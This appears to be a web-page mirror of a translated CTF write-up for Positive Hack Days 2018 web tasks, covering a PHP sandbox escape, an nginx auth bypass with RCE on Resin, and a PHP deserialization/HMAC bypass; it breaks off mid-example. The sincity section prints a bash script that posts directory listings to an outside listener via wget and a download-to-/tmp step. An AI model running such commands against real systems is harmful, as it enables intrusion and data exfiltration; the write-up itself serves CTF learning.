<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Positive Hack Days CTF 2018 task seekers: mnogorock, sincity, wowsuchchain, event0</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello. The annual PHD CTF passed and, as always, the tasks were very cool and interesting! This year, decided to 4 task. It may seem that the article ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Positive Hack Days CTF 2018 task seekers: mnogorock, sincity, wowsuchchain, event0</h1><div class="post__text post__text-html js-mediator-article">  Hello.  The annual PHD CTF passed and, as always, the tasks were very cool and interesting!  This year, decided to 4 task.  It may seem that the article is very long - but there are just a lot of screenshots. <br><a name="habracut"></a><br><h2>  mnogorock </h2><br>  An interesting PHP sandbox, the final solution of which in my opinion was easier to pick up on the ball, because  it is very simple.  But to come to him, it was necessary to figure out what was going on.  I came to the decision making a sickly hook.  I also did not immediately guess to google mongo rock, although the rearrangement of the letters was obvious =) <br><br>  Initially, we are given a URL where small hint is returned, what to do next. <br><br><img src="https://habrastorage.org/webt/ri/ao/ln/riaolnhlvgpyluuxq3ke1oif3fy.png">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      We collect POST request <br><br><img src="https://habrastorage.org/webt/sr/e_/ym/sre_ymdpjlz6o5doqtne9tvba3s.png"><br><br>  We see the result of the execution of the inform () command.  The first thing that comes to mind is an injection to the team, we try to insert quotes, bexleshes, parameters into the inform information, we study the behavior: <br><br><img src="https://habrastorage.org/webt/ty/9q/os/ty9qosmcbbzzhbcbija4nvz230e.png"><br><br><img src="https://habrastorage.org/webt/hv/4j/37/hv4j37fzo_qjx1pbsxqhxvt4iek.png"><br><br>  We see some kind of mistake ... But if you add another letter, <br><br><img src="https://habrastorage.org/webt/gm/ye/cx/gmyecxzkxnjl7fngqgox9ynga90.png"><br><br>  then at the end the php tag closes, that is, by injection, we close the line somewhere. <br><br>  Googling something like a caps (T_ENCAPSED_AND_WHITESPACE) - we understand that these are PHP lexical tokens.  This suggests that we have in front of PHP sandbox, where input is tokenized before the code is executed.  In this part of the tokens is prohibited to use.  And since  This is a sandbox, the injection is probably the wrong vector. <br><br>  Now we will try to write valid requests that will be skipped.  For example: <br><br><img src="https://habrastorage.org/webt/r4/su/hn/r4suhnhn2ie0xzrcj7tnceb34b8.png"><br><br>  we see that in this case the output occurred twice, we also see that the token T_CONSTANT_ENCAPSED_STRING (the string in quotes) is allowed, this turned out to be critically important. <br><br>  In general, here it would be possible to solve everything if I knew that pkhp allows us to do such things =) But I did not know.  Therefore, I took the full list of PHP tokens ( <a href="http://php.net/manual/en/tokens.php">here</a> ) and drove them into the Intruder to understand which ones are allowed.  Then I decided to google mongo rock and found the sandbox code that was used for the task.  It goes without saying that it was changed a bit for task, but it would not hurt to read the logic (At the same time, to compare the real code with the pseudo-code in the head that I compiled, studying the behavior of the blackbox program) <br>  <a href="https://github.com/iwind/rockmongo/blob/939017a6b4d0b6eb488288d362ed07744e3163d3/app/classes/VarEval.php">github.com/iwind/rockmongo/blob/939017a6b4d0b6eb488288d362ed07744e3163d3/app/classes/VarEval.php</a> <br><br>  We look at the function that produces tokenization before the eval of the code <br><br><pre><code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">_runPHP</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;_source = <span class="hljs-string"><span class="hljs-string">"return "</span></span> . <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;_source . <span class="hljs-string"><span class="hljs-string">";"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">"token_get_all"</span></span>)) {<span class="hljs-comment"><span class="hljs-comment">//tokenizer extension may be disabled $php = "</span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">&lt;?php</span></span></span><span class="hljs-comment">\n" . $this-&gt;_source . "\n</span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span><span class="hljs-comment">"; $tokens = token_get_all($php);</span></span></code> </pre> <br>  the $ php variable is the concat of strings, hence the line break and the closing tag in the example above, when we inserted inform () '' A.  Then there are 2 checks, the first one checks that the token includes the list of allowed: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (in_array($type, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( T_OPEN_TAG, T_RETURN, T_WHITESPACE,</code> </pre><br>  and the second is that the T_STRING tokens have valid values: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($type == T_STRING) { $func = strtolower($token[<span class="hljs-number"><span class="hljs-number">1</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (in_array($func, <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( <span class="hljs-comment"><span class="hljs-comment">//keywords allowed "mongoid‚Äù, ‚Ä¶.</span></span></code> </pre><br>  T_STRING tokens are the keywords of the language, probably only the function inform () was in this list.  And further, if conditions have passed, eval () code occurs.  Ie to call any function, transferring it as T_STRING the token will not work. <br><br>  Total we know that it is authorized to do a function call (but only one, inform), and strings in quotes are also skipped.  Then I remembered the tricks from JS and tried to do it like this: <br><br><img src="https://habrastorage.org/webt/cf/1z/gw/cf1zgwan0usmpynqi7g-8pozovc.png"><br><br>  Here is the solution.  It remains only to find the flag that lay in the file with a random name in root (/).  As I wrote at the beginning, the solution is very simple, but without knowing the subtleties of PHP, I had to tinker.  The truth is not as far as ... <br><br><h2>  sincity </h2><br>  Initially, the URL is usually given, open, see a picture of a city, there are no buttons, so we immediately look at the html code of the page. <br><br><img src="https://habrastorage.org/webt/s4/cz/6c/s4cz6ce5dxkrx3mzszhozjapvje.png"><br><br>  Pay attention to a strange array ... Let's try to open a non-existent page <br><br><img src="https://habrastorage.org/webt/py/ny/gr/pynygryqawrvsn1bzet3i8zrc7u.png"><br><br>  And here you can see the name of a very interesting server.  Prior to this task, I did not even know about the existence of such.  I didn‚Äôt read about all its features, the most interesting thing for task is that resin can integrate PHP and Java code (which legacy can bring) <br><br>  In general, nothing more can be seen on the main page, so we run dirsearch, or someone who loves and see what else is lying on the server. <br><br><img src="https://habrastorage.org/webt/b_/re/va/b_revadkagcvfnrvwzd4wggzzjy.png"><br><br>  Find and try to open the directory / dev /, and see Basic HTTP authentication. <br><br><img src="https://habrastorage.org/webt/z-/co/wp/z-cowphgzrhnwbuvwz_q9hcqd8c.png"><br><br>  This is the first part of task - to bypass Basic HTTP Auth.  The idea of ‚Äã‚Äãa detour is to make it so that on nginx the directory does not get into the / dev / regular program, which is under basic auth, but at the same time that the backend parses the URL path as / dev /.  I downloaded the full list of URLs in the Intruder, although it was immediately possible to guess: <br><br><img src="https://habrastorage.org/webt/6l/rg/um/6lrgumq9wjcxovzlooeintauoq4.png"><br><br>  After going through all 256 bytes in place of ¬ßparam¬ß, we find that when% 5c (bekslesh) the answer is different from the original one, that is, we fall into / dev /.  This is how the source code of the page in / dev / looked: <br><br><img src="https://habrastorage.org/webt/h5/va/t3/h5vat3powgj2xzqye40q9hns36q.png"><br><br>  We recall the same array on the first page.  This is similar to the list of files in the current directory. <br><br><ul><li>  task.php ~~~ edited is the source of task.php, which the type was forgotten to close in the editor, and it is sent to the browser with plain text. </li><li>  task.php - a script that can be run on a web server. </li></ul><br>  We look at the task.php code: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> error_reporting(<span class="hljs-number"><span class="hljs-number">0</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(md5($_COOKIE[<span class="hljs-string"><span class="hljs-string">'developer_testing_mode'</span></span>])==<span class="hljs-string"><span class="hljs-string">'0e313373133731337313373133731337'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(strlen($_GET[<span class="hljs-string"><span class="hljs-string">'constr'</span></span>])===<span class="hljs-number"><span class="hljs-number">4</span></span>){ $c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> $_GET[<span class="hljs-string"><span class="hljs-string">'constr'</span></span>]($_GET[<span class="hljs-string"><span class="hljs-string">'arg'</span></span>]); $c-&gt;$_GET[<span class="hljs-string"><span class="hljs-string">'param'</span></span>][<span class="hljs-number"><span class="hljs-number">0</span></span>]()-&gt;$_GET[<span class="hljs-string"><span class="hljs-string">'param'</span></span>][<span class="hljs-number"><span class="hljs-number">1</span></span>]($_GET[<span class="hljs-string"><span class="hljs-string">'test'</span></span>]); }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Swimming in the pool after using a bottle of vodka'</span></span>); } } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span></code> </pre> <br>  The first condition is to transfer such a <i>developer_testing_mode</i> cookie so that the md5 from it is equal to '0e313373133731337313373133731337'. <br><br>  I knew this thing, so I passed quickly.  This is a standard PHP error with a weak comparison.  I recommend to <a href="https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf">look here</a> . <br><br>  In short, in PHP, a comparison with 2 equal signs (==) considers ‚Äú0e12345‚Äù = ‚Äú0e54321‚Äù to be true.  That is, all that is needed to bypass is to find the value, from which the md5 will start with the byte \ x0e.  It is easy to google. <br><br>  The second condition in the code - if there is a certain constr parameter of length 4 bytes, then the following will be executed: <br><br><pre> <code class="php hljs">$c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> $_GET[<span class="hljs-string"><span class="hljs-string">'constr'</span></span>]($_GET[<span class="hljs-string"><span class="hljs-string">'arg'</span></span>]);</code> </pre> <br>  this is just a creation of a class object; if to write simpler it will be something like this: <br>  <i>$ c = new Class (parameter)</i> , where we control the name of the class and its parameter. <br><br>  second line <br><br><pre> <code class="php hljs">$c-&gt;$_GET[<span class="hljs-string"><span class="hljs-string">'param'</span></span>][<span class="hljs-number"><span class="hljs-number">0</span></span>]()-&gt;$_GET[<span class="hljs-string"><span class="hljs-string">'param'</span></span>][<span class="hljs-number"><span class="hljs-number">1</span></span>]($_GET[<span class="hljs-string"><span class="hljs-string">'test'</span></span>]);</code> </pre> <br>  If rewriting easier, then: <br>  <i>$ c-&gt; method1 () -&gt; method2 (parameter2)</i> - here we control the names of the methods and the parameter of the 2nd method. <br><br>  Obviously, this is RCE and it remains only to find the appropriate class names.  Recall that Resin integrates PHP and Java code (I didn‚Äôt remember right away, and at the beginning I started digging towards Phar). <br><br>  The solution to this task actually lies in the <a href="">Resin documentation</a> : <br><br><img src="https://habrastorage.org/webt/qd/fu/ii/qdfuii-hvv9sckspsibow8jxflw.png"><br><br>  Payload for RCE looks like this: <br><br><img src="https://habrastorage.org/webt/je/aw/ck/jeawckroo1sjxskylqpzgavah8g.png"><br><br>  There will be no withdrawal from the team, so we make a conclusion through the out-of-band technique.  We will raise a listener on the Internet for our requests, and launch a command on the server that will send the necessary information to our listener, with the payload above, something like this: <br><br><img src="https://habrastorage.org/webt/xa/cu/za/xacuza2vjkujgpshi965snfwf7a.png"><br><br>  Since  we do not know the name of the file with the flag; we need to make a listing of directories.  The class method <i>Runtime</i> - <i>exec ()</i> can accept a string and an array as input.  How full bash works only in the case of an array.  Then how can we pass only the string.  Therefore, we make a simple bash script: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash ls -l &gt; /tmp/adweifmwgfmlkerhbetlbm ls -l / &gt;&gt; /tmp/adweifmwgfmlkerhbetlbm wget --post-file=/tmp/adweifmwgfmlkerhbetlbm http://w4x.su:14501/</span></span></code> </pre> <br><br>  with the first request, we upload it to the server using <i>wget -O / tmp / pwn ....</i> , with the second request we launch it.  We accept the list of directories in the root on our listener, and then read the flag. <br><br><h2>  wowsuchchain </h2><br>  The most interesting of the four.  Tusk calls it so because it has a very long chain of bugs.  I probably solved it for 2 days and passed almost at the last moment on the way home, deciding from the train =) <br><br>  <a href="https://rdot.org/forum/showthread.php%3Ft%3D950">Useful article</a> that helps to solve this task (about serialization and magic methods). <br><br>  In the condition given the URL, open, we see a certain HTTP request logger: <br><br><img src="https://habrastorage.org/webt/aq/pg/fo/aqpgfoaayjgdo06qpdklr22nneg.png"><br><br>  After playing a bit with the parameters and not getting any of this, run dirsearch: <br><br><img src="https://habrastorage.org/webt/do/gj/pu/dogjpuzwk6naumwgirz5telubw8.png"><br><br>  adminer.php is an open source database admin tool.  Google immediately gives SSRF vulnerability, and even the exploit, although we do not really need the latter. <br><br>  Having opened the page with adminer we see the message: <br><br><img src="https://habrastorage.org/webt/mx/j2/bm/mxj2bmwe_xvxcyo6lg4r0d6ylci.png"><br><br>  where we are told that access is allowed only from internal resources.  We pay attention to the gateway of the local network, it is a small hint, what address the host can have with the installed Adminer. <br><br>  index.php.bak - we are given the source for the solution. <br><br>  index.php.bak source: <br><br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text"><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> session_start(); <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MetaInfo</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_SC</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $_SERVER[<span class="hljs-string"><span class="hljs-string">'SCRIPT_NAME'</span></span>]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_CT</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ date_default_timezone_set(<span class="hljs-string"><span class="hljs-string">'UTC'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> date(<span class="hljs-string"><span class="hljs-string">'Ymd H:i:s'</span></span>); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_UA</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_USER_AGENT'</span></span>]; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">get_IP</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ $client = @$_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_CLIENT_IP'</span></span>]; $forward = @$_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span></span>]; $remote = $_SERVER[<span class="hljs-string"><span class="hljs-string">'REMOTE_ADDR'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(filter_var($client, FILTER_VALIDATE_IP)){ $ip = $client; }<span class="hljs-keyword"><span class="hljs-keyword">elseif</span></span>(filter_var($forward, FILTER_VALIDATE_IP)){ $ip = $forward; }<span class="hljs-keyword"><span class="hljs-keyword">else</span></span>{ $ip = $remote; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ip; } } <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Logger</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $userdata; <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> $serverdata; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> $ip; <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__construct</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_COOKIE[<span class="hljs-string"><span class="hljs-string">'userdata'</span></span>])){ <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MetaInfo(); $ip = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata-&gt;get_IP(); $useragent = htmlspecialchars(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata-&gt;get_UA()); $serialized = serialize(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($ip,$useragent)); $key = getenv(<span class="hljs-string"><span class="hljs-string">'KEY'</span></span>); $nonce = md5(time()); $uniq_sig = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $nonce, $key); $crypto_arrow = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;ahalai($serialized,$uniq_sig); setcookie(<span class="hljs-string"><span class="hljs-string">"nonce"</span></span>,$nonce); setcookie(<span class="hljs-string"><span class="hljs-string">"hmac"</span></span>,$crypto_arrow); setcookie(<span class="hljs-string"><span class="hljs-string">"userdata"</span></span>,base64_encode($serialized)); header(<span class="hljs-string"><span class="hljs-string">"Location: /"</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists(<span class="hljs-string"><span class="hljs-string">'/tmp/log-'</span></span>.preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>,session_id()).<span class="hljs-string"><span class="hljs-string">'.txt'</span></span>)) { fopen(<span class="hljs-string"><span class="hljs-string">'/tmp/log-'</span></span>.preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>,session_id()).<span class="hljs-string"><span class="hljs-string">'.txt'</span></span>,<span class="hljs-string"><span class="hljs-string">'w'</span></span>); } } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">clear</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(file_put_contents(<span class="hljs-string"><span class="hljs-string">'/tmp/log-'</span></span>.preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>,session_id()).<span class="hljs-string"><span class="hljs-string">'.txt'</span></span>,<span class="hljs-string"><span class="hljs-string">"\n"</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"Log file cleaned!"</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">show</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ $data = file_get_contents(<span class="hljs-string"><span class="hljs-string">'/tmp/log-'</span></span>.preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>,session_id()).<span class="hljs-string"><span class="hljs-string">'.txt'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $data; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ahalai</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($serialized,$uniq_sig)</span></span></span></span>{ $magic = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;mahalai($serialized,$uniq_sig); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $magic; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">mahalai</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($serialized, $uniq_sig)</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $serialized,$uniq_sig); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__destruct</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_COOKIE[<span class="hljs-string"><span class="hljs-string">'userdata'</span></span>])){ $serialized = base64_decode($_COOKIE[<span class="hljs-string"><span class="hljs-string">'userdata'</span></span>]); $key = getenv(<span class="hljs-string"><span class="hljs-string">'KEY'</span></span>); $nonce = $_COOKIE[<span class="hljs-string"><span class="hljs-string">'nonce'</span></span>]; $uniq_sig = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $nonce, $key); $crypto_arrow = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;ahalai($serialized,$uniq_sig); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($crypto_arrow!==$_COOKIE[<span class="hljs-string"><span class="hljs-string">"hmac"</span></span>]){ <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata = unserialize($serialized); $ip = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata[<span class="hljs-number"><span class="hljs-number">0</span></span>]; $useragent = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;userdata[<span class="hljs-number"><span class="hljs-number">1</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata)) <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MetaInfo(); $current_time = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata-&gt;get_CT(); $script = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;serverdata-&gt;get_SC(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> file_put_contents(<span class="hljs-string"><span class="hljs-string">'/tmp/log-'</span></span>.preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>,session_id()).<span class="hljs-string"><span class="hljs-string">'.txt'</span></span>, $current_time.<span class="hljs-string"><span class="hljs-string">" - "</span></span>.$ip.<span class="hljs-string"><span class="hljs-string">" - "</span></span>.$script.<span class="hljs-string"><span class="hljs-string">" - "</span></span>.htmlspecialchars($useragent).<span class="hljs-string"><span class="hljs-string">"\n"</span></span>, FILE_APPEND); } } } $a = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Logger(); <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;center&gt; &lt;pre&gt; &lt;a href=<span class="hljs-string"><span class="hljs-string">"/"</span></span>&gt;index&lt;/a&gt; | &lt;a href=<span class="hljs-string"><span class="hljs-string">"/?act=show"</span></span>&gt;show log&lt;/a&gt; | &lt;a href=<span class="hljs-string"><span class="hljs-string">"/?act=clear"</span></span>&gt;clear log&lt;/a&gt; ----------------------------------------------------------------------------- <span class="hljs-meta"><span class="hljs-meta">&lt;?</span></span> <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> ($_GET[<span class="hljs-string"><span class="hljs-string">'act'</span></span>]) { <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'clear'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a-&gt;clear(); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-string"><span class="hljs-string">'show'</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a-&gt;show(); <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> <span class="hljs-string"><span class="hljs-string">"This is index page."</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; } <span class="hljs-meta"><span class="hljs-meta">?&gt;</span></span> &lt;/pre&gt;&lt;/center&gt;</code> </pre> </div></div><br>  We study the code.  The script creates the Logger class, and then returns the results of the <i>show</i> and <i>clear</i> methods depending on the request.  Immediately striking place with serialization and signatures.  The most interesting is in the constructor and destructor. <br><br>  In <i>__construct (),</i> some user data is generated and signed using the HMAC algorithm.  The secret key is stored in the environment variable.  After the signature, the data and the signature itself are given to the user.  This is an emulation of the session-side data storage approach  For example, Apache Tapestry does this and it seems I have met this approach somewhere else in ASP frameworks.  When using HMAC, change the data and bypass the signature is no longer possible.  Everything looks safe, so go to <i>__destructor ()</i> <br><br>  Since  I did not immediately see the bug in the signature verification in <i>__destruct ()</i> , I began to solve the task from the middle by running the script locally and commenting on a part of the code with the signature verification.  And he returned to the signature bypass at the end.  But everything will be in order =) <br><br><pre> <code class="php hljs">$serialized = base64_decode($_COOKIE[<span class="hljs-string"><span class="hljs-string">'userdata'</span></span>]); $key = getenv(<span class="hljs-string"><span class="hljs-string">'KEY'</span></span>); $nonce = $_COOKIE[<span class="hljs-string"><span class="hljs-string">'nonce'</span></span>]; $uniq_sig = hash_hmac(<span class="hljs-string"><span class="hljs-string">'md5'</span></span>, $nonce, $key); $crypto_arrow = <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;ahalai($serialized,$uniq_sig);</code> </pre><br>  The first thing you need to pay attention to is that we control the <i>nonce</i> variable, which without any filtering is given to the <i>hash_mac</i> function (PHP built-in function).  After that, <i>uniq_sig</i> is passed to the <i>ahalai</i> method, which is equivalent to the same <i>hash_hmac inside</i> .  Due to the lack of filtering of the <i>nonce</i> variable <i>,</i> an error occurs when our serialized payload can be signed not with the server's secret key, but with an empty string.  To understand what is happening, I sketched a short PoC: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $nonce = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>(<span class="hljs-string"><span 